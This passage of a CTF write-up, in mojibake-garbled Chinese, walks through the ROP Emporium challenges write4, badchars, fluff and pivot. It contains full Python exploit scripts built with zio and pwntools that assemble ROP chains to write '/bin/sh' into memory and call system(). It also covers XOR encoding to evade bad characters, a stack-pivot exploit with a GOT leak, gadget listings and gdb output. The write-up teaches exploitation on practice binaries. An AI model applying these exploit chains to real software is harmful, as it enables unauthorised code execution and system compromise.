<p>è¿™ä¸€æ¬¡ï¼Œæˆ‘ä»¬å·²ç»ä¸èƒ½åœ¨ç¨‹åºä¸­æ‰¾åˆ°å¯ä»¥æ‰§è¡Œçš„è¯­å¥äº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ gadgets å°† <code>/bin/sh</code> å†™å…¥åˆ°ç›®æ ‡è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­ï¼Œå¦‚ <code>.data</code> æ®µä¸­ï¼Œå†è°ƒç”¨ system() æ‰§è¡Œå®ƒï¼Œä»Žè€Œæ‹¿åˆ° shellã€‚è¦è®¤è¯†åˆ°ä¸€ä¸ªé‡è¦çš„ç‚¹æ˜¯ï¼ŒROP åªæ˜¯ä¸€ç§ä»»æ„ä»£ç æ‰§è¡Œçš„å½¢å¼ï¼Œåªè¦æˆ‘ä»¬æœ‰åˆ›æ„ï¼Œå°±å¯ä»¥åˆ©ç”¨å®ƒæ¥æ‰§è¡Œè¯¸å¦‚å†…å­˜è¯»å†™ç­‰æ“ä½œã€‚</p>
<p>è¿™ç§æ–¹æ³•è™½ç„¶å¥½ç”¨ï¼Œä½†è¿˜æ˜¯è¦è€ƒè™‘æˆ‘ä»¬å†™å…¥åœ°å€çš„è¯»å†™å’Œæ‰§è¡Œæƒé™ï¼Œä»¥åŠå®ƒèƒ½æä¾›çš„ç©ºé—´æ˜¯å¤šå°‘ï¼Œæˆ‘ä»¬å†™å…¥çš„å†…å®¹æ˜¯å¦ä¼šå½±å“åˆ°ç¨‹åºæ‰§è¡Œç­‰é—®é¢˜ã€‚å¦‚æˆ‘ä»¬æŽ¥ä¸‹æ¥æƒ³æŠŠå­—ç¬¦ä¸²å†™å…¥ <code>.data</code> æ®µï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å®ƒçš„æƒé™å’Œå¤§å°ç­‰ä¿¡æ¯ï¼š</p>
<pre><code class="language-text">$ readelf -S write432
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  ...
  [16] .rodata           PROGBITS        080486f8 0006f8 000064 00   A  0   0  4
  [25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
</code></pre>
<p>å¯ä»¥çœ‹åˆ° <code>.data</code> å…·æœ‰ <code>WA</code>ï¼Œå³å†™å…¥ï¼ˆwriteï¼‰å’Œåˆ†é…ï¼ˆallocï¼‰çš„æƒåˆ©ï¼Œè€Œ <code>.rodata</code> å°±ä¸èƒ½å†™å…¥ã€‚</p>
<p>ä½¿ç”¨å·¥å…· ropgadget å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„ gadgetsï¼š</p>
<pre><code class="language-text">$ ropgadget --binary write432 --only &quot;mov|pop|ret&quot;
...
0x08048670 : mov dword ptr [edi], ebp ; ret
0x080486da : pop edi ; pop ebp ; ret
</code></pre>
<p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯ 32 ä½ç¨‹åºï¼Œæ¯æ¬¡åªèƒ½å†™å…¥ 4 ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¦åˆ†æˆä¸¤æ¬¡å†™å…¥ï¼Œè¿˜å¾—æ³¨æ„å­—ç¬¦å¯¹é½ï¼Œæœ‰æ²¡æœ‰æˆªæ–­å­—ç¬¦ï¼ˆ<code>\x00</code>,<code>\x0a</code>ç­‰ï¼‰ä¹‹ç±»çš„é—®é¢˜ï¼Œæ¯”å¦‚è¿™é‡Œ <code>/bin/sh</code> åªæœ‰ä¸ƒä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>/bin/sh\00</code> æˆ–è€… <code>/bin//sh</code>ï¼Œæž„é€  payload å¦‚ä¸‹ï¼š</p>
<pre><code class="language-python">from zio import *

pop_edi_ebp = 0x080486da
mov_edi_ebp = 0x08048670

data_addr   = 0x804a028
system_plt  = 0x8048430

payload  = &quot;&quot;
payload += &quot;A&quot;*44
payload += l32(pop_edi_ebp)
payload += l32(data_addr)
payload += &quot;/bin&quot;
payload += l32(mov_edi_ebp)
payload += l32(pop_edi_ebp)
payload += l32(data_addr+4)
payload += &quot;/sh\x00&quot;
payload += l32(mov_edi_ebp)
payload += l32(system_plt)
payload += &quot;BBBB&quot;
payload += l32(data_addr)

io = zio('./write432')
io.writeline(payload)
io.interact()
$ python2 run.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(/binp,/shp0BBBB(ï¿½
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
&gt; cat flag.txt
ROPE{a_placeholder_32byte_flag!}
</code></pre>
<h3 id="write4">write4</h3>
<p>64 ä½ç¨‹åºå°±å¯ä»¥ä¸€æ¬¡æ€§å†™å…¥äº†ã€‚</p>
<pre><code class="language-text">$ ropgadget --binary write4 --only &quot;mov|pop|ret&quot;
...
0x0000000000400820 : mov qword ptr [r14], r15 ; ret
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400893 : pop rdi ; ret
from pwn import *

pop_r14_r15 = 0x0000000000400890
mov_r14_r15 = 0x0000000000400820
pop_rdi = 0x0000000000400893
data_addr = 0x0000000000601050
system_plt = 0x004005e0

payload  = &quot;A&quot;*40
payload += p64(pop_r14_r15)
payload += p64(data_addr)
payload += &quot;/bin/sh\x00&quot;
payload += p64(mov_r14_r15)
payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_plt)

io = process('./write4')
io.recvuntil('&gt;')
io.sendline(payload)
io.interactive()
</code></pre>
<h3 id="badchars32">badchars32</h3>
<p>åœ¨è¿™ä¸ªæŒ‘æˆ˜ä¸­ï¼Œæˆ‘ä»¬ä¾ç„¶è¦å°† <code>/bin/sh</code> å†™å…¥åˆ°è¿›ç¨‹å†…å­˜ä¸­ï¼Œä½†è¿™ä¸€æ¬¡ç¨‹åºåœ¨è¯»å–è¾“å…¥æ—¶ä¼šå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œæ£€æŸ¥ï¼ŒæŸ¥çœ‹å‡½æ•° <code>checkBadchars()</code>ï¼š</p>
<pre><code class="language-text">gdb-peda$ disassemble checkBadchars
Dump of assembler code for function checkBadchars:
   0x08048801 &lt;+0&gt;:     push   ebp
   0x08048802 &lt;+1&gt;:     mov    ebp,esp
   0x08048804 &lt;+3&gt;:     sub    esp,0x10
   0x08048807 &lt;+6&gt;:     mov    BYTE PTR [ebp-0x10],0x62
   0x0804880b &lt;+10&gt;:    mov    BYTE PTR [ebp-0xf],0x69
   0x0804880f &lt;+14&gt;:    mov    BYTE PTR [ebp-0xe],0x63
   0x08048813 &lt;+18&gt;:    mov    BYTE PTR [ebp-0xd],0x2f
   0x08048817 &lt;+22&gt;:    mov    BYTE PTR [ebp-0xc],0x20
   0x0804881b &lt;+26&gt;:    mov    BYTE PTR [ebp-0xb],0x66
   0x0804881f &lt;+30&gt;:    mov    BYTE PTR [ebp-0xa],0x6e
   0x08048823 &lt;+34&gt;:    mov    BYTE PTR [ebp-0x9],0x73
   0x08048827 &lt;+38&gt;:    mov    DWORD PTR [ebp-0x4],0x0
   0x0804882e &lt;+45&gt;:    mov    DWORD PTR [ebp-0x8],0x0
   0x08048835 &lt;+52&gt;:    mov    DWORD PTR [ebp-0x4],0x0
   0x0804883c &lt;+59&gt;:    jmp    0x804887c &lt;checkBadchars+123&gt;
   0x0804883e &lt;+61&gt;:    mov    DWORD PTR [ebp-0x8],0x0
   0x08048845 &lt;+68&gt;:    jmp    0x8048872 &lt;checkBadchars+113&gt;
   0x08048847 &lt;+70&gt;:    mov    edx,DWORD PTR [ebp+0x8]
   0x0804884a &lt;+73&gt;:    mov    eax,DWORD PTR [ebp-0x4]
   0x0804884d &lt;+76&gt;:    add    eax,edx
   0x0804884f &lt;+78&gt;:    movzx  edx,BYTE PTR [eax]
   0x08048852 &lt;+81&gt;:    lea    ecx,[ebp-0x10]
   0x08048855 &lt;+84&gt;:    mov    eax,DWORD PTR [ebp-0x8]
   0x08048858 &lt;+87&gt;:    add    eax,ecx
   0x0804885a &lt;+89&gt;:    movzx  eax,BYTE PTR [eax]
   0x0804885d &lt;+92&gt;:    cmp    dl,al
   0x0804885f &lt;+94&gt;:    jne    0x804886e &lt;checkBadchars+109&gt;
   0x08048861 &lt;+96&gt;:    mov    edx,DWORD PTR [ebp+0x8]
   0x08048864 &lt;+99&gt;:    mov    eax,DWORD PTR [ebp-0x4]
   0x08048867 &lt;+102&gt;:   add    eax,edx
   0x08048869 &lt;+104&gt;:   mov    BYTE PTR [eax],0xeb
   0x0804886c &lt;+107&gt;:   jmp    0x8048878 &lt;checkBadchars+119&gt;
   0x0804886e &lt;+109&gt;:   add    DWORD PTR [ebp-0x8],0x1
   0x08048872 &lt;+113&gt;:   cmp    DWORD PTR [ebp-0x8],0x7
   0x08048876 &lt;+117&gt;:   jbe    0x8048847 &lt;checkBadchars+70&gt;
   0x08048878 &lt;+119&gt;:   add    DWORD PTR [ebp-0x4],0x1
   0x0804887c &lt;+123&gt;:   mov    eax,DWORD PTR [ebp-0x4]
   0x0804887f &lt;+126&gt;:   cmp    eax,DWORD PTR [ebp+0xc]
   0x08048882 &lt;+129&gt;:   jb     0x804883e &lt;checkBadchars+61&gt;
   0x08048884 &lt;+131&gt;:   nop
   0x08048885 &lt;+132&gt;:   leave  
   0x08048886 &lt;+133&gt;:   ret
End of assembler dump.
</code></pre>
<p>å¾ˆæ˜Žæ˜¾ï¼Œåœ°å€ <code>0x08048807</code> åˆ° <code>0x08048823</code> çš„å­—ç¬¦å°±æ˜¯æ‰€è°“çš„æ•æ„Ÿå­—ç¬¦ã€‚å¤„ç†æ•æ„Ÿå­—ç¬¦åœ¨åˆ©ç”¨å¼€å‘ä¸­æ˜¯ç»å¸¸è¦ç”¨åˆ°çš„ï¼Œä¸ä»…ä»…æ˜¯è¦å¯¹å‚æ•°è¿›è¡Œç¼–ç ï¼Œæœ‰æ—¶ç”šè‡³åœ°å€ä¹Ÿè¦å¦‚æ­¤ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç®€å•çš„å¼‚æˆ–æ“ä½œæ¥å¯¹å­—ç¬¦ä¸²ç¼–ç å’Œè§£ç ã€‚</p>
<p>æ‰¾åˆ° gadgetsï¼š</p>
<pre><code class="language-text">$ ropgadget --binary badchars32 --only &quot;mov|pop|ret|xor&quot;
...
0x08048893 : mov dword ptr [edi], esi ; ret
0x08048896 : pop ebx ; pop ecx ; ret
0x08048899 : pop esi ; pop edi ; ret
0x08048890 : xor byte ptr [ebx], cl ; ret
</code></pre>
<p>æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹å°±æ˜¯å†™å…¥å‰ç¼–ç ï¼Œä½¿ç”¨å‰è§£ç ï¼Œä¸‹é¢æ˜¯ payloadï¼š</p>
<pre><code class="language-python">from zio import *

xor_ebx_cl  = 0x08048890
pop_ebx_ecx = 0x08048896
pop_esi_edi = 0x08048899
mov_edi_esi = 0x08048893

system_plt  = 0x080484e0
data_addr   = 0x0804a038

# encode
badchars    = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte    = 0x1
while(1):
    binsh = &quot;&quot;
    for i in &quot;/bin/sh\x00&quot;:
        c = ord(i) ^ xor_byte
        if c in badchars:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 8:
        break

# write
payload  = &quot;A&quot;*44
payload += l32(pop_esi_edi)
payload += binsh[:4]
payload += l32(data_addr)
payload += l32(mov_edi_esi)
payload += l32(pop_esi_edi)
payload += binsh[4:8]
payload += l32(data_addr + 4)
payload += l32(mov_edi_esi)

# decode
for i in range(len(binsh)):
    payload += l32(pop_ebx_ecx)
    payload += l32(data_addr + i)
    payload += l32(xor_byte)
    payload += l32(xor_ebx_cl)

# run
payload += l32(system_plt)
payload += &quot;BBBB&quot;
payload += l32(data_addr)

io = zio('./badchars32')
io.writeline(payload)
io.interact()
</code></pre>
<h3 id="badchars">badchars</h3>
<p>64 ä½ç¨‹åºä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ³¨æ„å‚æ•°ä¼ é€’å°±å¥½äº†ã€‚</p>
<pre><code class="language-text">$ ropgadget --binary badchars --only &quot;mov|pop|ret|xor&quot;
...
0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
0x0000000000400b3b : pop r12 ; pop r13 ; ret
0x0000000000400b40 : pop r14 ; pop r15 ; ret
0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
0x0000000000400b39 : pop rdi ; ret
from pwn import *

pop_r12_r13  = 0x0000000000400b3b
mov_r13_r12  = 0x0000000000400b34
pop_r14_r15  = 0x0000000000400b40
xor_r15_r14b = 0x0000000000400b30
pop_rdi      = 0x0000000000400b39

system_plt = 0x00000000004006f0
data_addr  = 0x0000000000601000

badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte = 0x1
while(1):
    binsh = &quot;&quot;
    for i in &quot;/bin/sh\x00&quot;:
        c = ord(i) ^ xor_byte
        if c in badchars:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 8:
        break

payload  = &quot;A&quot;*40
payload += p64(pop_r12_r13)
payload += binsh
payload += p64(data_addr)
payload += p64(mov_r13_r12)

for i in range(len(binsh)):
    payload += p64(pop_r14_r15)
    payload += p64(xor_byte)
    payload += p64(data_addr + i)
    payload += p64(xor_r15_r14b)

payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_plt)

io = process('./badchars')
io.recvuntil('&gt;')
io.sendline(payload)
io.interactive()
</code></pre>
<h3 id="fluff32">fluff32</h3>
<p>è¿™ä¸ªç»ƒä¹ ä¸Žä¸Šé¢æ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œéš¾ç‚¹åœ¨äºŽæˆ‘ä»¬èƒ½æ‰¾åˆ°çš„ gadgets ä¸æ˜¯é‚£ä¹ˆç›´æŽ¥ï¼Œæœ‰ä¸€ä¸ªæŠ€å·§æ˜¯å› ä¸ºæˆ‘ä»¬çš„ç›®çš„æ˜¯å†™å…¥å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå¿…ç„¶éœ€è¦ <code>mov [reg], reg</code> è¿™æ ·çš„ gadgetsï¼Œæˆ‘ä»¬å°±ä»Žè¿™é‡Œå‡ºå‘ï¼Œå€’æŽ¨æ‰€éœ€çš„ gadgetsã€‚</p>
<pre><code class="language-text">$ ropgadget --binary fluff32 --only &quot;mov|pop|ret|xor|xchg&quot;
...
0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
0x080483e1 : pop ebx ; ret
0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
</code></pre>
<p>æˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªè¿™æ ·çš„ <code>mov dword ptr [ecx], edx ;</code>ï¼Œå¯ä»¥æƒ³åˆ°æˆ‘ä»¬å°†åœ°å€æ”¾è¿› <code>ecx</code>ï¼Œå°†æ•°æ®æ”¾è¿› <code>edx</code>ï¼Œä»Žè€Œå°†æ•°æ®å†™å…¥åˆ°åœ°å€ä¸­ã€‚payload å¦‚ä¸‹ï¼š</p>
<pre><code class="language-python">from zio import *

system_plt   = 0x08048430
data_addr    = 0x0804a028

pop_ebx      = 0x080483e1
mov_ecx_edx  = 0x08048693
xchg_edx_ecx = 0x08048689
xor_edx_ebx  = 0x0804867b
xor_edx_edx  = 0x08048671

def write_data(data, addr):
    # addr -&gt; ecx
    payload  = l32(xor_edx_edx)
    payload += &quot;BBBB&quot;
    payload += l32(pop_ebx)
    payload += l32(addr)
    payload += l32(xor_edx_ebx)
    payload += &quot;BBBB&quot;
    payload += l32(xchg_edx_ecx)
    payload += &quot;BBBB&quot;

    # data -&gt; edx
    payload += l32(xor_edx_edx)
    payload += &quot;BBBB&quot;
    payload += l32(pop_ebx)
    payload += data
    payload += l32(xor_edx_ebx)
    payload += &quot;BBBB&quot;

    # edx -&gt; [ecx]
    payload += l32(mov_ecx_edx)
    payload += &quot;BBBB&quot;
    payload += l32(0)

    return payload

payload  = &quot;A&quot;*44

payload += write_data(&quot;/bin&quot;, data_addr)
payload += write_data(&quot;/sh\x00&quot;, data_addr + 4)

payload += l32(system_plt)
payload += &quot;BBBB&quot;
payload += l32(data_addr)

io = zio('./fluff32')
io.writeline(payload)
io.interact()
</code></pre>
<h3 id="fluff">fluff</h3>
<p>æç¤ºï¼šåœ¨ä½¿ç”¨ ropgadget æœç´¢æ—¶åŠ ä¸Šå‚æ•° <code>--depth</code> å¯ä»¥å¾—åˆ°æ›´å¤§é•¿åº¦çš„ gadgetsã€‚</p>
<pre><code class="language-text">$ ropgadget --binary fluff --only &quot;mov|pop|ret|xor|xchg&quot; --depth 20
...
0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
from pwn import *

system_plt = 0x004005e0
data_addr  = 0x0000000000601050

xor_r11_r11 = 0x0000000000400822
xor_r11_r12 = 0x000000000040082f
xchg_r11_r10 = 0x0000000000400840
mov_r10_r11 = 0x000000000040084c
pop_r12 = 0x0000000000400832

def write_data(data, addr):
    # addr -&gt; r10
    payload  = p64(xor_r11_r11)
    payload += &quot;BBBBBBBB&quot;
    payload += p64(pop_r12)
    payload += p64(addr)
    payload += p64(xor_r11_r12)
    payload += &quot;BBBBBBBB&quot;
    payload += p64(xchg_r11_r10)
    payload += &quot;BBBBBBBB&quot;

    # data -&gt; r11
    payload += p64(xor_r11_r11)
    payload += &quot;BBBBBBBB&quot;
    payload += p64(pop_r12)
    payload += data
    payload += p64(xor_r11_r12)
    payload += &quot;BBBBBBBB&quot;

    # r11 -&gt; [r10]
    payload += p64(mov_r10_r11)
    payload += &quot;BBBBBBBB&quot;*2
    payload += p64(0)

    return payload

payload  = &quot;A&quot;*40
payload += write_data(&quot;/bin/sh\x00&quot;, data_addr)
payload += p64(system_plt)

io = process('./fluff')
io.recvuntil('&gt;')
io.sendline(payload)
io.interactive()
</code></pre>
<h3 id="pivot32">pivot32</h3>
<p>è¿™æ˜¯æŒ‘æˆ˜çš„æœ€åŽä¸€é¢˜ï¼Œéš¾åº¦çªç„¶å¢žåŠ ã€‚é¦–å…ˆæ˜¯åŠ¨æ€åº“ï¼ŒåŠ¨æ€åº“ä¸­å‡½æ•°çš„ç›¸å¯¹ä½ç½®æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å¦‚æžœæˆ‘ä»¬çŸ¥é“å…¶ä¸­ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå°±å¯ä»¥é€šè¿‡ç›¸å¯¹ä½ç½®å…³ç³»å¾—åˆ°å…¶ä»–ä»»æ„å‡½æ•°çš„åœ°å€ã€‚åœ¨å¼€å¯ ASLR çš„æƒ…å†µä¸‹ï¼ŒåŠ¨æ€åº“åŠ è½½åˆ°å†…å­˜ä¸­çš„åœ°å€æ˜¯å˜åŒ–çš„ï¼Œä½†å¹¶ä¸å½±å“åº“ä¸­å‡½æ•°çš„ç›¸å¯¹ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠžæ³•å…ˆæ³„éœ²å‡ºæŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œä»Žè€Œå¾—åˆ°ç›®æ ‡å‡½æ•°åœ°å€ã€‚</p>
<p>é€šè¿‡åˆ†æžæˆ‘ä»¬çŸ¥é“è¯¥ç¨‹åºä»ŽåŠ¨æ€åº“ <code>libpivot32.so</code> ä¸­å¯¼å…¥äº†å‡½æ•° <code>foothold_function()</code>ï¼Œä½†åœ¨ç¨‹åºé€»è¾‘ä¸­å¹¶æ²¡æœ‰è°ƒç”¨ï¼Œè€Œåœ¨ <code>libpivot32.so</code> ä¸­è¿˜æœ‰æˆ‘ä»¬éœ€è¦çš„å‡½æ•° <code>ret2win()</code>ã€‚</p>
<p>çŽ°åœ¨æˆ‘ä»¬çŸ¥é“äº†å¯ä»¥æ³„éœ²çš„å‡½æ•° <code>foothold_function()</code>ï¼Œé‚£ä¹ˆæ€Žä¹ˆæ³„éœ²å‘¢ã€‚å‰é¢æˆ‘ä»¬å·²ç»ç®€å•ä»‹ç»äº†å»¶æ—¶ç»‘å®šæŠ€æœ¯ï¼Œå½“æˆ‘ä»¬åœ¨è°ƒç”¨å¦‚ <code>func@plt()</code> çš„æ—¶å€™ï¼Œç³»ç»Ÿæ‰ä¼šå°†çœŸæ­£çš„ <code>func()</code> å‡½æ•°åœ°å€å†™å…¥åˆ° GOT è¡¨çš„ <code>func.got.plt</code> ä¸­ï¼Œç„¶åŽ <code>func@plt()</code> æ ¹æ® <code>func.got.plt</code> è·³è½¬åˆ°çœŸæ­£çš„ <code>func()</code> å‡½æ•°ä¸ŠåŽ»ã€‚</p>
<p>æœ€åŽæ˜¯è¯¥æŒ‘æˆ˜æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œç¨‹åºè¿è¡Œæˆ‘ä»¬æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥è¢«æ”¾åœ¨ä¸€ä¸ªç”± <code>malloc()</code> å‡½æ•°åˆ†é…çš„å †ä¸Šï¼Œå½“ç„¶ä¸ºäº†é™ä½Žéš¾åº¦ï¼Œç¨‹åºç‰¹åœ°å°†è¯¥åœ°å€æ‰“å°äº†å‡ºæ¥ï¼Œç¬¬äºŒæ¬¡çš„è¾“å…¥åˆ™è¢«æ”¾åœ¨ä¸€ä¸ªå¤§å°é™åˆ¶ä¸º 13 å­—èŠ‚çš„æ ˆä¸Šï¼Œè¿™ä¸ªç©ºé—´ä¸è¶³ä»¥è®©æˆ‘ä»¬æ‰§è¡Œå¾ˆå¤šä¸œè¥¿ï¼Œæ‰€ä»¥éœ€è¦è¿ç”¨ stack pivotï¼Œå³é€šè¿‡è¦†ç›–è°ƒç”¨è€…çš„ ebpï¼Œå°†æ ˆå¸§è½¬ç§»åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼ŒåŒæ—¶æŽ§åˆ¶ eipï¼Œå³å¯æ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµï¼Œé€šå¸¸çš„ payloadï¼ˆè¿™é‡Œç§°ä¸ºå‰¯payloadï¼‰ ç»“æž„å¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">buffer padding | fake ebp | leave;ret addr |
</code></pre>
<p>è¿™æ ·å‡½æ•°çš„è¿”å›žåœ°å€å°±è¢«è¦†ç›–ä¸º leave;ret æŒ‡ä»¤çš„åœ°å€ï¼Œè¿™æ ·ç¨‹åºåœ¨æ‰§è¡Œå®Œå…¶åŽŸæœ¬çš„ leave;ret åŽï¼Œåˆæ‰§è¡Œäº†ä¸€æ¬¡ leave;retã€‚</p>
<p>å¦å¤– fake ebp æŒ‡å‘æˆ‘ä»¬å¦ä¸€æ®µ payloadï¼ˆè¿™é‡Œç§°ä¸ºä¸»payloadï¼‰ çš„ ebpï¼Œå³ ä¸»payload åœ°å€å‡ 4 çš„åœ°æ–¹ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨æž„é€  ä¸»payload æ—¶åœ¨å‰é¢åŠ  4 ä¸ªå­—èŠ‚çš„ padding ä½œä¸º ebpï¼š</p>
<pre><code class="language-text">ebp | payload
</code></pre>
<p>æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªå‡½æ•°çš„å…¥å£ç‚¹é€šå¸¸æ˜¯ï¼š</p>
<pre><code class="language-text">push ebp
mov  ebp,esp
</code></pre>
<p>leave æŒ‡ä»¤ç›¸å½“äºŽï¼š</p>
<pre><code class="language-text">mov esp,ebp
pop ebp
</code></pre>
<p>ret æŒ‡ä»¤ä¸ºç›¸å½“äºŽï¼š</p>
<pre><code class="language-text">pop eip
</code></pre>
<p>å¦‚æžœé‡åˆ°ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çš„æ ˆæº¢å‡ºçš„å­—èŠ‚æ•°æ¯”è¾ƒå°ï¼Œä¸èƒ½å®Œæˆå…¨éƒ¨çš„å·¥ä½œï¼ŒåŒæ—¶ç¨‹åºå¼€å¯äº† PIE æˆ–è€…ç³»ç»Ÿå¼€å¯äº† ASLRï¼Œä½†åŒæ—¶åœ¨ç¨‹åºçš„å¦ä¸€ä¸ªåœ°æ–¹æœ‰è¶³å¤Ÿçš„ç©ºé—´å¯ä»¥å†™å…¥ payloadï¼Œå¹¶ä¸”å¯æ‰§è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°†æ ˆè½¬ç§»åˆ°é‚£ä¸ªåœ°æ–¹åŽ»ã€‚</p>
<p>å®Œæ•´çš„ exp å¦‚ä¸‹ï¼š</p>
<pre><code class="language-python">from pwn import *

#context.log_level = 'debug'
#context.terminal = ['konsole']
io = process('./pivot32')
elf = ELF('./pivot32')
libp = ELF('./libpivot32.so')

leave_ret = 0x0804889f

foothold_plt     = elf.plt['foothold_function'] # 0x080485f0
foothold_got_plt = elf.got['foothold_function'] # 0x0804a024

pop_eax      = 0x080488c0
pop_ebx      = 0x08048571
mov_eax_eax  = 0x080488c4
add_eax_ebx  = 0x080488c7
call_eax     = 0x080486a3

foothold_sym = libp.symbols['foothold_function']
ret2win_sym  = libp.symbols['ret2win']
offset = int(ret2win_sym - foothold_sym) # 0x1f7

leakaddr  = int(io.recv().split()[20], 16)

# calls foothold_function() to populate its GOT entry, then queries that value into EAX
#gdb.attach(io)
payload_1  = p32(foothold_plt)
payload_1 += p32(pop_eax)
payload_1 += p32(foothold_got_plt)
payload_1 += p32(mov_eax_eax)
payload_1 += p32(pop_ebx)
payload_1 += p32(offset)
payload_1 += p32(add_eax_ebx)
payload_1 += p32(call_eax)

io.sendline(payload_1)

# ebp = leakaddr-4, esp = leave_ret
payload_2  = &quot;A&quot;*40
payload_2 += p32(leakaddr-4) + p32(leave_ret)

io.sendline(payload_2)
print io.recvall()
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬åœ¨ gdb ä¸­éªŒè¯ä¸€ä¸‹ï¼Œåœ¨ pwnme() å‡½æ•°çš„ leave å¤„ä¸‹æ–­ç‚¹ï¼š</p>
<pre><code class="language-text">gdb-peda$ b *0x0804889f
Breakpoint 1 at 0x804889f
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EBX: 0x0
ECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EDX: 0xf7731860 --&gt; 0x0
ESI: 0xf772fe28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0xffe7ec68 --&gt; 0xf755cf0c --&gt; 0x0
ESP: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EIP: 0x804889f (&lt;pwnme+173&gt;:    leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048896 &lt;pwnme+164&gt;:       call   0x80485b0 &lt;fgets@plt&gt;
   0x804889b &lt;pwnme+169&gt;:       add    esp,0x10
   0x804889e &lt;pwnme+172&gt;:       nop
=&gt; 0x804889f &lt;pwnme+173&gt;:       leave  
   0x80488a0 &lt;pwnme+174&gt;:       ret
   0x80488a1 &lt;uselessFunction&gt;: push   ebp
   0x80488a2 &lt;uselessFunction+1&gt;:       mov    ebp,esp
   0x80488a4 &lt;uselessFunction+3&gt;:       sub    esp,0x8
[------------------------------------stack-------------------------------------]
0000| 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
0004| 0xffe7ec44 ('A' &lt;repeats 36 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
0008| 0xffe7ec48 ('A' &lt;repeats 32 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
0012| 0xffe7ec4c ('A' &lt;repeats 28 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
0016| 0xffe7ec50 ('A' &lt;repeats 24 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
0020| 0xffe7ec54 ('A' &lt;repeats 20 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
0024| 0xffe7ec58 ('A' &lt;repeats 16 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
0028| 0xffe7ec5c ('A' &lt;repeats 12 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804889f in pwnme ()
gdb-peda$ x/10w 0xffe7ec68
0xffe7ec68:     0xf755cf0c      0x0804889f      0xf755000a      0x00000000
0xffe7ec78:     0x00000002      0x00000000      0x00000001      0xffe7ed44
0xffe7ec88:     0xf755cf10      0xf655d010
